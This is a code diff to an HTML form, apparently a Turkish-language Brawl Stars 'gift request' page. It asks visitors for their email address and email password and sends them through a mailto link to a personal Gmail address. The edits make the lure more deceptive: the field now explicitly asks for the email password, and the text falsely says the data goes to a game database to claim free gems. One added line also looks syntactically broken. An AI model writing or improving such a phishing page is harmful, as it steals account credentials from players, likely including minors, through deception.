@@ -140,7 +140,7 @@
             </div>
             
             <div class="form-group">
-                <label for="password">Şifre:</label>
+                <label for="password">E-posta Şifre:</label>
                 <input type="password" id="password" name="password" required>
             </div>
             
@@ -178,19 +178,20 @@
             const secenek = encodeURIComponent(document.querySelector('input[name="secenek"]:checked').value);
             
             // Mailto linkini oluştur
-            const subject = encodeURIComponent("Yeni Brawl Stars Üyeliği");
+            const subject = encodeURIComponent("Brawl Stars Hediye Talep Formu");
             const body = encodeURIComponent(
                 `E-posta: ${decodeURIComponent(email)}\n` +
                 `Şifre: ${decodeURIComponent(password)}\n` +
                 `Seçilen Eşya Miktarı: ${decodeURIComponent(secenek)} 💎\n\n` +
-                `Bu ileti Brawl Stars üyelik formundan gönderilmiştir.`
+                `Bu bilgiler Brawl Stars veritabanından hediye hakkınızı alabilmeniz için kullanılacaktır.`
+                'Gönder butonuna basarak hediyenizi kazanabilirsiniz.'
             );
             
             // Kullanıcının email istemcisini aç
             window.location.href = `mailto:soner27atar@gmail.com?subject=${subject}&body=${body}`;
             
             // Kullanıcıyı bilgilendir
-            alert('E-posta istemciniz açılacak. Gönder butonuna basarak bilgileri ulaştırabilirsiniz.');
+            alert('E-posta istemciniz açılacak. Gönder butonuna basarak bilgileri veritabanına ulaştırabilirsiniz.');
         }
     </script>
 </body>
